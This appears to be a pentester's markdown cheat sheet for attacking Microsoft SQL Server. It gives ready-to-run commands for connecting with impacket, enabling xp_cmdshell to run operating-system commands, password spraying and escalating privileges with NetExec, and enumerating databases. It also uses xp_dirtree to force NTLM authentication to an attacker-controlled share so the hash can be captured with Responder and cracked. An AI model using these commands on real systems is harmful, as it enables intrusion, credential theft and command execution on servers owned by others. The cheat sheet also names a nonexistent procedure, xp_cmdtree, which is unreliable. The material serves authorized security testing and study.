# MSsql Escalation

## Remote Connection

impacket-mssqlclient -windows-auth '<domain>/<username>:<password>'@<tartget_ip>
impacket-mssqlclient '<username>:<password>'@<tartget_ip>

## Basic Information

select @@version; # version of ms_sql
SELECT is_srvrolemember('sysadmin'); #checks if we are admin
select system_user; # returns the current user in the db


## Try to get access to xp_cmdshell

Use shell commands

	EXEC xp_cmdshell 'net user'; # This allows us to execute commands.
	exec xp_cmdtree 'whoami'; # This allows us to execute commands.


If we cant use it we need to activate it.

	EXEC sp_configure 'show advanced options', 1;
	RECONFIGURE;
	EXEC sp_configure 'xp_cmdshell', 1;
	RECONFIGURE;

## Get NTLM hash

Check if we can do a xp_dirtree

	exec xp_dirtree 'c:\'; # Checks if we can list files
	if this is successful we can now try to do a request back to us
	exec xp_dirtree '\\our_ip\test\test';
	we can check if we receive the request with nc. This request will attempt a ntlm authentication, so we can start responder to get the hash and then try to crack it. The test share and file dont have to exist


## With NetExec

### Password Spray

	netexec mssql <targetip> -u <file_with_usernames> -p <file_with_passwords>
	netexec mssql DCO1 -u usernames.txt -p passwords.txt

### PrivEsc

	netexec mssql <targetip> -u <username> -p <password> -M mssql_priv
	netexec mssql <targetip> -u <username> -p <password> -M mssql_priv -o ACTION=privesc

### Execute Queries

	netexec mssql <targetip> -u <username> -p <password> -q 'SELECT name FROM master.dbo.sysdatabases;'


## Db enum

Show databases:

	SELECT name FROM sys.databases;

Use database:

	USE <database_name>;

Show tables:

	SELECT table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE';

## Relevant Information

	https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
	https://www.netexec.wiki/mssql-protocol/